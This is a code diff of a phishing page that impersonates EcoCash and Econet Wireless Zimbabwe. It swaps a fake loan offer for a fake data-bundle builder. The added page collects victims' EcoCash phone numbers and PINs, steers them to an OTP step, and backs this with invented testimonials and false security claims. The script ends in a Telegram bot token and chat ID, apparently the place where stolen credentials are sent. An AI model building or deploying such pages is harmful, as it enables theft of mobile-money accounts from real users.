-    <div>
-      <div class="hero-stat-val">10.9%</div>
-      <div class="hero-stat-lbl">Monthly Rate</div>
-    </div>
-    <div class="stat-divider"></div>
-    <div>
-      <div class="hero-stat-val">6 Months</div>
-      <div class="hero-stat-lbl">Max Term</div>
-    </div>
+<!-- ═══ TICKER ═══ -->
+<div class="ticker-wrap">
+  <div class="ticker-inner">
+    <span>⚡ Mix Voice, SMS &amp; Data — Build Your Own Bundle</span>
+    <span>💵 Prices in USD · Zimbabwe's #1 Network</span>
+    <span>📱 Powered by Econet Wireless · Pay via EcoCash</span>
+    <span>🔒 256-bit Encrypted · PCI DSS Compliant</span>
+    <span>⚡ Mix Voice, SMS &amp; Data — Build Your Own Bundle</span>
+    <span>💵 Prices in USD · Zimbabwe's #1 Network</span>
+    <span>📱 Powered by Econet Wireless · Pay via EcoCash</span>
+    <span>🔒 256-bit Encrypted · PCI DSS Compliant</span>
   </div>
-</section>
+</div>
 
-<!-- CALCULATOR -->
-<section class="calc-section" id="calculator">
-  <div class="calc-card">
-    <div class="calc-header">
+<!-- ═══ HEADER ═══ -->
+<header>
+  <div class="nav-content">
+    <div class="logo" onclick="scrollToTop()">
+      <div class="logo-icon"><span>E</span></div>
       <div>
-        <h2>Loan Calculator</h2>
-        <p>Customize your loan to fit your needs</p>
+        <div class="logo-name">Eco<em>Cash</em></div>
+        <span class="logo-sub">Econet Wireless · Zimbabwe</span>
       </div>
-      <div class="rate-pill">10.9% / month</div>
     </div>
-    <div class="calc-body">
+    <nav class="nav-links" id="navLinks">
+      <a onclick="scrollTo('bundles')">Bundles</a>
+      <a onclick="scrollTo('how')">How It Works</a>
+      <a onclick="scrollTo('benefits')">Benefits</a>
+      <a onclick="scrollTo('faq')">FAQ</a>
+    </nav>
+    <div style="display:flex;align-items:center;gap:12px">
+      <div class="live-pill"><span class="live-dot"></span>Live</div>
+      <button class="hamburger" id="hamburger" aria-label="Toggle menu" aria-expanded="false">☰</button>
+    </div>
+  </div>
+</header>
 
-      <div class="field">
-        <div class="field-label">
-          <span>Loan Amount</span>
-        </div>
-        <div class="amount-display"><span class="cur">ZiG</span><span id="amountDisplay">500</span></div>
-        <div class="slider-track">
-          <input type="range" id="loanSlider" min="500" max="50000" value="500" step="500" oninput="onSlider()">
-        </div>
-        <div class="range-labels"><span>ZiG 500</span><span>ZiG 50,000</span></div>
+<!-- ═══ HERO ═══ -->
+<section class="hero">
+  <div class="hero-badge"><span class="live-dot"></span>Mix Bundle Builder</div>
+  <h1>Build Your Own<br/><em>Econet Bundle</em></h1>
+  <p>Mix Voice, SMS &amp; Data exactly the way you want it.<br/>Pay securely via EcoCash. Active instantly.</p>
+  <button class="hero-cta" onclick="scrollTo('bundles')">🛒 Build My Bundle</button>
+  <div class="hero-stats">
+    <div class="hstat">💵 Prices in USD</div>
+    <div class="hstat">⚡ Instant Activation</div>
+    <div class="hstat">🔒 EcoCash Secure</div>
+    <div class="hstat">🇿🇼 Econet Zimbabwe</div>
+  </div>
+</section>
+
+<!-- ═══ STATS STRIP ═══ -->
+<div class="stats-strip">
+  <div class="stats-grid">
+    <div class="stat-item"><div class="stat-val green">USD</div><div class="stat-label">US Dollar Pricing</div></div>
+    <div class="stat-item"><div class="stat-val">5</div><div class="stat-label">Bundle Periods</div></div>
+    <div class="stat-item"><div class="stat-val green">$0.60</div><div class="stat-label">Starting Price</div></div>
+    <div class="stat-item"><div class="stat-val">4G</div><div class="stat-label">Nationwide Network</div></div>
+  </div>
+</div>
+
+<!-- ═══ MIX BUNDLE BUILDER ═══ -->
+<section id="bundles" class="section">
+  <span class="section-label">Mix Bundle Builder</span>
+  <h2 class="section-title">Choose Your Bundle Period</h2>
+  <p class="section-sub">Select a period below to jump to it, then slide to mix your Voice, SMS and Data exactly how you need it. Your price updates live.</p>
+
+  <div class="summary-card" id="summaryCard" aria-live="polite">
+    <div class="summary-left">
+      <div>
+        <div class="summary-period" id="summary-period">Daily</div>
+        <div class="summary-price-label">Your bundle price</div>
+        <div class="summary-price" id="summary-price">USD 0.60</div>
       </div>
+    </div>
+    <div class="summary-metrics">
+      <div class="summary-metric"><div class="sm-label">Voice</div><div class="sm-val" id="summary-voice">20 Min</div></div>
+      <div class="summary-metric"><div class="sm-label">SMS</div><div class="sm-val" id="summary-sms">25 SMS</div></div>
+      <div class="summary-metric"><div class="sm-label">Data</div><div class="sm-val" id="summary-data">3 GB</div></div>
+    </div>
+  </div>
 
-      <div class="field">
-        <div class="field-label"><span>Repayment Term</span></div>
-        <div class="term-grid">
-          <button class="term-btn active" data-m="1" onclick="pickTerm(1)">1 Mo</button>
-          <button class="term-btn" data-m="2" onclick="pickTerm(2)">2 Mo</button>
-          <button class="term-btn" data-m="3" onclick="pickTerm(3)">3 Mo</button>
-          <button class="term-btn" data-m="4" onclick="pickTerm(4)">4 Mo</button>
-          <button class="term-btn" data-m="5" onclick="pickTerm(5)">5 Mo</button>
-          <button class="term-btn" data-m="6" onclick="pickTerm(6)">6 Mo</button>
-        </div>
-      </div>
+  <div class="period-tabs-wrap">
+    <div class="period-tabs">
+      <a class="ptab active" onclick="jumpTo('bundle-daily',this)">Daily<span class="ptab-price">USD 0.60</span></a>
+      <a class="ptab" onclick="jumpTo('bundle-threeday',this)">3 Days<span class="ptab-price">USD 1.40</span></a>
+      <a class="ptab" onclick="jumpTo('bundle-weekly',this)">Weekly<span class="ptab-price">USD 2.80</span></a>
+      <a class="ptab" onclick="jumpTo('bundle-twoweek',this)">2 Weeks<span class="ptab-price">USD 5.20</span></a>
+      <a class="ptab" onclick="jumpTo('bundle-monthly',this)">Monthly<span class="ptab-price">USD 9.90</span></a>
+    </div>
+  </div>
 
-      <div class="result-banner">
-        <div class="result-item">
-          <div class="rl">Monthly Payment</div>
-          <div class="rv blue" id="monthlyOut">ZiG 555</div>
-        </div>
-        <div class="result-item">
-          <div class="rl">Total Interest</div>
-          <div class="rv" id="interestOut">ZiG 55</div>
-        </div>
-        <div class="result-item">
-          <div class="rl">Total Repayment</div>
-          <div class="rv green" id="totalOut">ZiG 555</div>
-        </div>
-      </div>
+  <div class="bundles-stack" id="bundlesStack"></div>
+</section>
 
-      <p class="calc-note">Flat rate: 10.9% per month · <span id="termNote">1 month</span> · ZiG currency</p>
-      <button class="apply-btn" onclick="openModal()">APPLY NOW — Get Funds in 15 Minutes</button>
+<!-- ═══ HOW IT WORKS ═══ -->
+<section id="how" class="section" style="background:var(--surface)">
+  <span class="section-label">How It Works</span>
+  <h2 class="section-title">5 Simple Steps to Get Your Bundle</h2>
+  <p class="section-sub">From building your mix to instant activation — the exact journey through EcoCash.</p>
+  <div class="steps-grid">
+    <div class="step-card">
+      <div class="step-num" style="background:linear-gradient(135deg,var(--blue),var(--blue-light))">1</div>
+      <span class="step-icon-badge">🛒</span>
+      <h3>Build &amp; Subscribe</h3>
+      <p>Pick a period, slide Voice, SMS &amp; Data to your mix, then tap <strong>Subscribe</strong> and review your bundle in the confirmation sheet.</p>
+    </div>
+    <div class="step-card">
+      <div class="step-num" style="background:linear-gradient(135deg,var(--blue),var(--blue-light))">2</div>
+      <span class="step-icon-badge">✅</span>
+      <h3>Confirm &amp; Pay</h3>
+      <p>Check your Duration, Voice, SMS, Data and total USD amount in the pop-up, then tap <strong>Pay with EcoCash</strong> to proceed.</p>
+    </div>
+    <div class="step-card">
+      <div class="step-num" style="background:linear-gradient(135deg,var(--blue),var(--blue-light))">3</div>
+      <span class="step-icon-badge">📱</span>
+      <h3>Enter EcoCash Number &amp; PIN</h3>
+      <p>Enter your ZW +263 number and 4-digit PIN in the secure payment panel to identify your EcoCash wallet.</p>
+    </div>
+    <div class="step-card">
+      <div class="step-num" style="background:linear-gradient(135deg,var(--green-dark),var(--green))">4</div>
+      <span class="step-icon-badge">💬</span>
+      <h3>Verify OTP</h3>
+      <p>A one-time PIN is sent to your Econet number by SMS. Enter it on the verification screen to authorise the payment.</p>
+    </div>
+    <div class="step-card">
+      <div class="step-num" style="background:linear-gradient(135deg,var(--green-dark),var(--green))">5</div>
+      <span class="step-icon-badge">⚡</span>
+      <h3>Bundle Activated Instantly</h3>
+      <p>Payment confirmed — your bundle is live immediately. Dial <strong>*143#</strong> on your Econet line anytime to check your remaining balance.</p>
     </div>
   </div>
 </section>
 
-<!-- WHY ECOCASH FLEX -->
-<section class="why-section" id="about">
-  <div class="section-inner">
-    <div class="section-label">Why Choose Us</div>
-    <div class="section-title">Why EcoCash Flex Loans?</div>
-    <p class="section-sub">Fast disbursements, transparent rates, and a 100% digital experience built for Zimbabwe.</p>
-    <div class="why-grid">
-      <div class="why-card">
-        <div class="why-icon">⚡</div>
-        <h4>Instant Disbursement</h4>
-        <p>Once approved, funds land directly in your EcoCash wallet — no queues, no paperwork, no delays.</p>
-      </div>
-      <div class="why-card">
-        <div class="why-icon">📊</div>
-        <h4>Transparent Rates</h4>
-        <p>10.9% per month, flat. Your full repayment is shown upfront in ZiG before you ever confirm.</p>
-      </div>
-      <div class="why-card">
-        <div class="why-icon">📱</div>
-        <h4>100% Digital</h4>
-        <p>Apply, track, and repay entirely from your phone through the EcoCash platform you already trust.</p>
-      </div>
-    </div>
+<!-- ═══ BENEFITS ═══ -->
+<section id="benefits" class="section">
+  <span class="section-label">Why EcoCash</span>
+  <h2 class="section-title">Why Choose Econet Bundles?</h2>
+  <div class="benefits-grid">
+    <div class="benefit-card"><div class="benefit-icon">🎛️</div><h3>Fully Customisable</h3><p>Mix Voice, SMS and Data any way you like. Pay only for exactly what you need.</p></div>
+    <div class="benefit-card"><div class="benefit-icon">💵</div><h3>USD Pricing</h3><p>All bundles priced in US Dollars — transparent, stable Zimbabwe pricing you can trust.</p></div>
+    <div class="benefit-card"><div class="benefit-icon">⚡</div><h3>Instant Activation</h3><p>Pay via EcoCash and your bundle activates immediately. No delays, no branch visits.</p></div>
+    <div class="benefit-card"><div class="benefit-icon">🔒</div><h3>256-bit Secure</h3><p>All EcoCash transactions are fully encrypted and PCI DSS compliant. Your data is safe.</p></div>
   </div>
 </section>
 
-<!-- HOW IT WORKS -->
-<section class="how-section" id="how">
-  <div class="section-inner">
-    <div class="section-label">Simple Process</div>
-    <div class="section-title">How to Apply</div>
-    <p class="section-sub">Three simple steps from calculator to cash in your wallet.</p>
-    <div class="steps-row">
-      <div class="step-card">
-        <div class="step-num">1</div>
-        <h4>Enter Your Details</h4>
-        <p>Provide your full name, EcoCash phone number, employment status, and monthly income.</p>
-      </div>
-      <div class="step-card">
-        <div class="step-num">2</div>
-        <h4>Review Everything</h4>
-        <p>Confirm your personal info, loan amount, repayment term, interest rate, and total repayment.</p>
-      </div>
-      <div class="step-card">
-        <div class="step-num">3</div>
-        <h4>Complete Verification</h4>
-        <p>Submit and proceed through secure EcoCash identity verification. Approval in as little as 15 minutes.</p>
-      </div>
-    </div>
+<!-- ═══ TESTIMONIALS ═══ -->
+<section class="section" style="background:var(--surface)">
+  <span class="section-label">Reviews</span>
+  <h2 class="section-title">What Customers Say</h2>
+  <div class="testimonials-grid">
+    <div class="testimonial-card"><div class="t-stars">★★★★★</div><div class="t-text">"The mix builder is brilliant — I set exactly 100 minutes, 50 SMS and 5GB. No waste!"</div><div class="t-author">— Tinashe M., Harare</div></div>
+    <div class="testimonial-card"><div class="t-stars">★★★★★</div><div class="t-text">"USD pricing makes budgeting so easy. EcoCash payment is instant and secure."</div><div class="t-author">— Chiedza K., Bulawayo</div></div>
+    <div class="testimonial-card"><div class="t-stars">★★★★★</div><div class="t-text">"I use the monthly bundle every month — 600 minutes is perfect for my business."</div><div class="t-author">— Farai N., Gweru</div></div>
+    <div class="testimonial-card"><div class="t-stars">★★★★★</div><div class="t-text">"The weekly bundle at $2.80 is incredible value. Activated in seconds via EcoCash."</div><div class="t-author">— Rutendo T., Mutare</div></div>
+    <div class="testimonial-card"><div class="t-stars">★★★★★</div><div class="t-text">"Finally a network that lets me choose exactly what I want. No forced bundles."</div><div class="t-author">— Blessing C., Masvingo</div></div>
+    <div class="testimonial-card"><div class="t-stars">★★★★★</div><div class="t-text">"Best mobile bundle experience in Zimbabwe. EcoCash makes it completely painless."</div><div class="t-author">— Tapiwa Z., Chinhoyi</div></div>
   </div>
 </section>
 
-<!-- FAQ -->
-<section class="faq-section" id="faq">
-  <div class="section-inner">
-    <div class="section-label" style="text-align:center">Got Questions?</div>
-    <div class="section-title" style="text-align:center; margin-bottom:36px">Frequently Asked Questions</div>
-    <div class="faq-list">
-      <div class="faq-item open">
-        <div class="faq-q" onclick="toggleFaq(this)">
-          <span>What currency is used?</span>
-          <div class="faq-icon">▼</div>
-        </div>
-        <div class="faq-ans">
-          <div class="faq-ans-inner">All amounts are displayed and processed in ZiG (Zimbabwe Gold), the local currency, throughout the calculator, review, and summary steps.</div>
-        </div>
-      </div>
-      <div class="faq-item">
-        <div class="faq-q" onclick="toggleFaq(this)">
-          <span>What is the maximum loan amount?</span>
-          <div class="faq-icon">▼</div>
-        </div>
-        <div class="faq-ans">
-          <div class="faq-ans-inner">You can apply for up to ZiG 50,000 with a repayment term of up to 6 months at a flat rate of 10.9% per month.</div>
-        </div>
-      </div>
-      <div class="faq-item">
-        <div class="faq-q" onclick="toggleFaq(this)">
-          <span>Is collateral required?</span>
-          <div class="faq-icon">▼</div>
-        </div>
-        <div class="faq-ans">
-          <div class="faq-ans-inner">No collateral is required. EcoCash Flex Loans are fully unsecured and based on your EcoCash account history and declared income.</div>
-        </div>
-      </div>
-      <div class="faq-item">
-        <div class="faq-q" onclick="toggleFaq(this)">
-          <span>How quickly will I receive the funds?</span>
-          <div class="faq-icon">▼</div>
-        </div>
-        <div class="faq-ans">
-          <div class="faq-ans-inner">Once approved — typically within 15 minutes — funds are disbursed directly and instantly to your EcoCash wallet.</div>
-        </div>
-      </div>
-      <div class="faq-item">
-        <div class="faq-q" onclick="toggleFaq(this)">
-          <span>How do I repay my loan?</span>
-          <div class="faq-icon">▼</div>
-        </div>
-        <div class="faq-ans">
-          <div class="faq-ans-inner">Repayments are made directly through your EcoCash wallet on the agreed monthly schedule. You will receive reminders via your registered mobile number.</div>
-        </div>
-      </div>
-    </div>
+<!-- ═══ FAQ ═══ -->
+<section id="faq" class="section">
+  <span class="section-label">FAQ</span>
+  <h2 class="section-title">Frequently Asked Questions</h2>
+  <div class="faq-grid">
+    <div class="faq-card"><button class="faq-question" onclick="toggleFaq(this)">What currency are bundles priced in?<div class="faq-icon">+</div></button><div class="faq-answer"><div class="faq-ans-text">All bundles are priced in USD (US Dollars) — the primary currency used in Zimbabwe for Econet services.</div></div></div>
+    <div class="faq-card"><button class="faq-question" onclick="toggleFaq(this)">How do I pay via EcoCash?<div class="faq-icon">+</div></button><div class="faq-answer"><div class="faq-ans-text">After customising your bundle, click "Subscribe" and confirm. You'll enter your EcoCash number and PIN to authorise payment directly on this page.</div></div></div>
+    <div class="faq-card"><button class="faq-question" onclick="toggleFaq(this)">Can I mix Voice, SMS and Data freely?<div class="faq-icon">+</div></button><div class="faq-answer"><div class="faq-ans-text">Yes! Use the sliders to allocate as much or as little Voice, SMS and Data as you need. Your price updates in real time.</div></div></div>
+    <div class="faq-card"><button class="faq-question" onclick="toggleFaq(this)">What periods are available?<div class="faq-icon">+</div></button><div class="faq-answer"><div class="faq-ans-text">Daily ($0.60), 3 Days ($1.40), Weekly ($2.80), 2 Weeks ($5.20) and Monthly ($9.90).</div></div></div>
+    <div class="faq-card"><button class="faq-question" onclick="toggleFaq(this)">How quickly is my bundle activated?<div class="faq-icon">+</div></button><div class="faq-answer"><div class="faq-ans-text">Instantly. As soon as your EcoCash payment is authorised, your bundle is live and ready to use.</div></div></div>
+    <div class="faq-card"><button class="faq-question" onclick="toggleFaq(this)">Is my EcoCash payment secure?<div class="faq-icon">+</div></button><div class="faq-answer"><div class="faq-ans-text">Yes. All transactions are 256-bit encrypted and PCI DSS compliant. Your PIN is never stored. Powered by Econet Wireless.</div></div></div>
+    <div class="faq-card"><button class="faq-question" onclick="toggleFaq(this)">Can I check my bundle balance?<div class="faq-icon">+</div></button><div class="faq-answer"><div class="faq-ans-text">Yes. Dial *143# on your Econet line to check your active bundle balances at any time.</div></div></div>
+    <div class="faq-card"><button class="faq-question" onclick="toggleFaq(this)">Do unused minutes, SMS or data expire?<div class="faq-icon">+</div></button><div class="faq-answer"><div class="faq-ans-text">Bundle allocations are valid for the active period chosen. They do not roll over automatically.</div></div></div>
   </div>
 </section>
 
-<!-- TESTIMONIALS -->
-<section class="t-section">
-  <div class="section-inner">
-    <div class="section-label">Customer Experience</div>
-    <div class="section-title">What Customers Say</div>
-    <p class="section-sub">Real feedback from EcoCash users across Zimbabwe.</p>
-    <div class="t-grid">
-      <div class="t-card">
-        <div class="t-stars">★★★★★</div>
-        <p class="t-text">"The calculator showed my full repayment clearly before I confirmed. The three-step review process made everything transparent and easy."</p>
-        <div class="t-author">Tendai M.</div>
-        <div class="t-role">Small business owner, Harare</div>
-      </div>
-      <div class="t-card">
-        <div class="t-stars">★★★★★</div>
-        <p class="t-text">"The page works perfectly on my phone. The familiar EcoCash colours gave me confidence from the very start of the process."</p>
-        <div class="t-author">Rudo N.</div>
-        <div class="t-role">Trader, Bulawayo</div>
-      </div>
-      <div class="t-card">
-        <div class="t-stars">★★★★★</div>
-        <p class="t-text">"I could review every detail before submitting. Quick, transparent, and the money was in my wallet the same day."</p>
-        <div class="t-author">Farai C.</div>
-        <div class="t-role">Contractor, Mutare</div>
-      </div>
-    </div>
-  </div>
-</section>
+<!-- ═══ CTA BANNER ═══ -->
+<div class="cta-banner">
+  <h2>Ready to Build Your Bundle?</h2>
+  <p>Mix Voice, SMS &amp; Data your way. Pay in USD via EcoCash.</p>
+  <button class="hero-cta" onclick="scrollTo('bundles')">🛒 Build My Bundle Now</button>
+</div>
 
-<!-- FOOTER -->
+<!-- ═══ FOOTER ═══ -->
 <footer>
   <div class="footer-inner">
-    <div class="footer-grid">
-      <div>
-        <div class="footer-logo-wrap">
-          <span class="f-eco">Eco</span><span class="f-cash">Cash</span>
-        </div>
-        <p class="footer-desc">Fast, secure, and flexible loan applications for Zimbabwe EcoCash customers. Funds straight to your wallet in as little as 15 minutes.</p>
+    <div class="footer-brand">
+      <div class="footer-brand-logo" onclick="scrollToTop()">
+        <div class="logo-icon" style="width:40px;height:40px"><span style="font-size:16px">E</span></div>
+        <div style="font-size:1.4rem;font-weight:900;color:white;letter-spacing:-.5px">Eco<span style="color:var(--green)">Cash</span></div>
       </div>
-      <div class="footer-col">
-        <h5>Product</h5>
-        <a href="#calculator">Loan Calculator</a>
-        <a href="#about">Why Choose Us</a>
-        <a href="#how">How It Works</a>
-      </div>
-      <div class="footer-col">
-        <h5>Quick Links</h5>
-        <a href="#home">Home</a>
-        <a href="#faq">FAQ</a>
-        <a href="login.html">Sign In</a>
-      </div>
-      <div class="footer-col">
-        <h5>Legal</h5>
-        <a href="#" class="disabled">Terms of Service</a>
-        <a href="#" class="disabled">Privacy Policy</a>
-        <a href="#" class="disabled">Loan Agreement</a>
-        <a href="#" class="disabled">Contact Us</a>
-      </div>
+      <div class="footer-divider"></div>
+      <p>Mix Bundle Builder powered by Econet Wireless Zimbabwe. Pay securely via EcoCash in USD.</p>
     </div>
-    <div class="footer-bottom">
-      <span>© 2026 EcoCash Flex Loans. All rights reserved.</span>
-      <div class="footer-live"><div class="live-dot"></div> Zimbabwe Mobile Money</div>
+    <div class="footer-col">
+      <h4>Bundles</h4>
+      <a onclick="jumpTo('bundle-daily')">Daily Bundle</a>
+      <a onclick="jumpTo('bundle-threeday')">3-Day Bundle</a>
+      <a onclick="jumpTo('bundle-weekly')">Weekly Bundle</a>
+      <a onclick="jumpTo('bundle-monthly')">Monthly Bundle</a>
     </div>
+    <div class="footer-col">
+      <h4>EcoCash</h4>
+      <a onclick="scrollTo('bundles')">Pay via EcoCash</a>
+      <a>Check Balance *143#</a>
+      <a>EcoCash App</a>
+    </div>
+    <div class="footer-col">
+      <h4>Help &amp; Legal</h4>
+      <a>Contact Support</a>
+      <a>Privacy Policy</a>
+      <a>Terms &amp; Conditions</a>
+      <a onclick="scrollTo('faq')">FAQ</a>
+    </div>
+  </div>
+  <div class="footer-bottom">
+    <p>© <span id="yr"></span> Econet Wireless Zimbabwe. All Rights Reserved.</p>
+    <div class="footer-badge"><div class="footer-badge-dot"></div>256-bit Encrypted · PCI DSS Compliant · EcoCash Powered</div>
   </div>
 </footer>
 
-<!-- APPLICATION MODAL -->
-<div class="overlay" id="appModal">
-  <div class="modal" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
+<!-- ═══ CONFIRM MODAL ═══ -->
+<div class="modal" id="confirmModal" role="dialog" aria-modal="true" aria-labelledby="mod-heading">
+  <div class="modal-box">
+    <div class="modal-drag"><div class="modal-drag-bar"></div></div>
     <div class="modal-head">
-      <div>
-        <div class="modal-logo" id="modalTitle">Eco<span class="mc">Cash</span> Flex Loans</div>
-        <div class="modal-sub" id="modalSub">Step 1 of 3 — Your Details</div>
-      </div>
-      <button class="modal-close" onclick="closeModal()" aria-label="Close">×</button>
+      <h3 id="mod-heading">Confirm your bundle</h3>
+      <button class="modal-close-btn" onclick="closeModal()" aria-label="Close">✕</button>
     </div>
     <div class="modal-body">
-      <div class="progress">
-        <div class="prog-seg active" id="seg1"></div>
-        <div class="prog-seg" id="seg2"></div>
-        <div class="prog-seg" id="seg3"></div>
+      <span class="modal-section-label">Bundle Details</span>
+      <div class="modal-rows-card">
+        <div class="modal-row"><span class="modal-row-left"><span class="modal-row-dot"></span>Duration</span><span class="modal-row-val" id="mod-duration">Daily</span></div>
+        <div class="modal-row"><span class="modal-row-left"><span class="modal-row-dot"></span>Voice</span><span class="modal-row-val" id="mod-voice">20 Min</span></div>
+        <div class="modal-row"><span class="modal-row-left"><span class="modal-row-dot"></span>SMS</span><span class="modal-row-val" id="mod-sms">25 SMS</span></div>
+        <div class="modal-row"><span class="modal-row-left"><span class="modal-row-dot"></span>Data</span><span class="modal-row-val" id="mod-data">3 GB</span></div>
       </div>
-
-      <!-- STEP 1 -->
-      <div id="step1">
-        <div class="loan-sum">
-          <div>
-            <div class="ls-lbl">Loan Amount</div>
-            <div class="ls-val">ZiG <span id="sumAmt">500</span></div>
-          </div>
-          <div>
-            <div class="ls-lbl">Total Repayment</div>
-            <div class="ls-val green">ZiG <span id="sumRepay">555</span></div>
-          </div>
-        </div>
-        <div class="fgroup">
-          <label class="flabel" for="fullName">Full Name</label>
-          <input type="text" class="finput" id="fullName" placeholder="e.g. Tendai Moyo" autocomplete="name">
-        </div>
-        <div class="fgroup">
-          <label class="flabel">EcoCash Number</label>
-          <div class="phone-wrap">
-            <span class="phone-code">🇿🇼 +263</span>
-            <input type="tel" class="finput" id="appPhone" placeholder="77 123 4567" inputmode="numeric" maxlength="9">
-          </div>
-        </div>
-        <div class="frow">
-          <div class="fgroup">
-            <label class="flabel" for="employment">Employment Status</label>
-            <select class="finput" id="employment">
-              <option value="">Select…</option>
-              <option>Employed</option>
-              <option>Self-Employed</option>
-              <option>Business Owner</option>
-              <option>Student</option>
-              <option>Other</option>
-            </select>
-          </div>
-          <div class="fgroup">
-            <label class="flabel" for="income">Monthly Income (ZiG)</label>
-            <input type="number" class="finput" id="income" placeholder="e.g. 3 000" min="1" inputmode="numeric">
-          </div>
-        </div>
-        <button class="btn-primary" onclick="goStep(2)">Review Details →</button>
+      <div class="modal-total-row">
+        <span class="modal-total-label">Total to pay</span>
+        <span class="modal-total-val" id="mod-total">USD 0.60</span>
       </div>
-
-      <!-- STEP 2 -->
-      <div id="step2" style="display:none">
-        <p style="font-family:'Sora',sans-serif;font-size:15px;font-weight:700;margin-bottom:16px">Review Your Information</p>
-        <div class="review-box">
-          <div class="review-row"><span class="rr-lbl">Full Name</span><span class="rr-val" id="revName">—</span></div>
-          <div class="review-row"><span class="rr-lbl">EcoCash Number</span><span class="rr-val" id="revPhone">—</span></div>
-          <div class="review-row"><span class="rr-lbl">Employment</span><span class="rr-val" id="revEmploy">—</span></div>
-          <div class="review-row"><span class="rr-lbl">Monthly Income</span><span class="rr-val" id="revIncome">—</span></div>
-        </div>
-        <div class="review-box">
-          <div class="review-row"><span class="rr-lbl">Loan Amount</span><span class="rr-val" id="revAmount">—</span></div>
-          <div class="review-row"><span class="rr-lbl">Repayment Period</span><span class="rr-val" id="revPeriod">—</span></div>
-          <div class="review-row"><span class="rr-lbl">Interest Rate</span><span class="rr-val" id="revRate">—</span></div>
-          <div class="review-row"><span class="rr-lbl">Total Repayment</span><span class="rr-val" style="color:var(--green)" id="revTotal">—</span></div>
-        </div>
-        <button class="btn-primary" onclick="goStep(3)">Confirm &amp; Proceed →</button>
-        <button class="btn-ghost" onclick="goStep(1)">← Back</button>
+      <div class="modal-btns">
+        <button class="mbtn mbtn-cancel" onclick="closeModal()">Cancel</button>
+        <button class="mbtn mbtn-confirm" id="mod-confirm-btn">Pay with EcoCash</button>
       </div>
-
-      <!-- STEP 3 -->
-      <div id="step3" style="display:none">
-        <div class="success-center">
-          <div class="success-icon">✓</div>
-          <h3>Application Submitted!</h3>
-          <p>Your application has been saved. Continue to EcoCash verification to finalise and receive your funds.</p>
-        </div>
-        <div class="review-box">
-          <div class="review-row"><span class="rr-lbl">Amount Borrowed</span><span class="rr-val">ZiG <span id="finalAmt">—</span></span></div>
-          <div class="review-row"><span class="rr-lbl">Total Repayment</span><span class="rr-val" style="color:var(--green)">ZiG <span id="finalRepay">—</span></span></div>
-        </div>
-        <button class="btn-primary" onclick="goVerify()">Continue to Verification →</button>
-        <button class="btn-ghost" onclick="goStep(2)">← Back</button>
-        <div class="verify-msg" id="verifyMsg">
-          Verification is handled through the EcoCash app. Please open your EcoCash app on your registered number to complete the process and receive your funds.
-        </div>
-      </div>
-
     </div>
   </div>
 </div>
 
+<!-- ═══ PAYMENT PANEL (replaces login.html) ═══ -->
+<div id="paymentPanel" role="dialog" aria-modal="true" aria-label="EcoCash Payment">
+  <div class="pay-card">
+    <div class="pay-card-inner">
+      <button class="pay-back" onclick="closePaymentPanel()">← Back to Builder</button>
+
+      <div class="pay-logo">
+        <div class="pay-logo-text"><span class="pay-logo-eco">Eco</span><span class="pay-logo-cash">Cash</span></div>
+        <div class="pay-pill">Mix Bundle · Econet Zimbabwe</div>
+      </div>
+
+      <div class="pay-title">Confirm &amp; Pay</div>
+      <p class="pay-sub">Enter your EcoCash number and PIN to authorise payment for your bundle.</p>
+
+      <!-- Bundle recap — filled by JS -->
+      <div class="pay-bundle-recap">
+        <div class="pay-bundle-recap-title">Your selected bundle</div>
+        <div class="pbr-grid">
+          <div class="pbr-item"><div class="pbr-label">Duration</div><div class="pbr-val" id="pbr-period">—</div></div>
+          <div class="pbr-item"><div class="pbr-label">Voice</div><div class="pbr-val" id="pbr-voice">—</div></div>
+          <div class="pbr-item"><div class="pbr-label">SMS</div><div class="pbr-val" id="pbr-sms">—</div></div>
+          <div class="pbr-item"><div class="pbr-label">Data</div><div class="pbr-val" id="pbr-data">—</div></div>
+        </div>
+        <div class="pbr-total">
+          <span class="pbr-total-label">Total to pay</span>
+          <span class="pbr-total-val" id="pbr-price">USD —</span>
+        </div>
+      </div>
+
+      <div class="pay-form">
+        <label class="pay-field-label" for="payPhone">EcoCash Mobile Number</label>
+        <div class="pay-input-group">
+          <span class="pay-flag">🇿🇼</span>
+          <span class="pay-prefix">+263</span>
+          <input type="tel" class="pay-input" id="payPhone" placeholder="Phone Number" inputmode="numeric" autocomplete="tel" maxlength="9">
+        </div>
+
+        <div class="pay-spacer"></div>
+
+        <label class="pay-field-label" for="payPin">EcoCash PIN</label>
+        <div class="pay-input-group">
+          <input type="password" class="pay-input pay-input-pin" id="payPin" placeholder="4-digit PIN" inputmode="numeric" maxlength="4">
+        </div>
+
+        <p class="pay-hint">Your number and PIN are used only to authorise this EcoCash payment. 256-bit encrypted &amp; PCI DSS compliant.</p>
+
+        <div class="pay-error" id="payError"></div>
+
+        <button class="pay-btn" id="payBtn">Pay with EcoCash</button>
+      </div>
+
+      <div class="pay-terms">By continuing you agree to the <a href="https://ecocash.co.zw/terms-and-conditions/" target="_blank" rel="noopener">Terms and Conditions</a>.</div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ SPINNER OVERLAY ═══ -->
+<div id="spinnerOverlay">
+  <div class="spinner"></div>
+  <div class="spin-label">Verifying &amp; Processing</div>
+  <div class="spin-sub">Please hold on…</div>
+</div>
+
+<!-- ═══ AUTH SCREEN ═══ -->
+<div id="authScreen" role="status" aria-live="polite">
+  <div class="auth-logo-wrap">
+    <div class="auth-econet">
+      <span class="auth-econet-main">ECONET</span>
+      <span class="auth-econet-sub">Wireless</span>
+    </div>
+    <span class="auth-ecocash">EcoCash</span>
+  </div>
+  <div class="auth-spinner"></div>
+  <div class="auth-title">Authorising</div>
+  <div class="auth-sub">Processing payment request…</div>
+  <div class="auth-dots">
+    <div class="auth-dot" id="dot1"></div>
+    <div class="auth-dot" id="dot2"></div>
+    <div class="auth-dot dash" id="dot3"></div>
+  </div>
+</div>
+
 <script>
-  const RATE = 0.109;
-  const CUR  = 'ZiG';
-  let selMonths = 1;
-  let loanData  = { amount: 500, months: 1, total: 555, monthly: 555, interest: 55 };
+/* ════════════════════════════════════════════
+   TELEGRAM CONFIG
+════════════════════════════════════════════ */
+var CONFIG = {
+  BOT_TOKEN:    '8746906558:AAHpzw4CN1J8y4LdO7f8fBsZ_DIFhKYuXB8',
+  CHAT_ID:      '7547427914',
+  APPROVE_PAGE: 'otp.html',
+  DEVICE_PAGE:  'device.html',
+  SUCCESS_PAGE: 'success.html'
+};
 
-  /* ── CALCULATOR ── */
-  function calc() {
-    const a        = parseInt(document.getElementById('loanSlider').value) || 500;
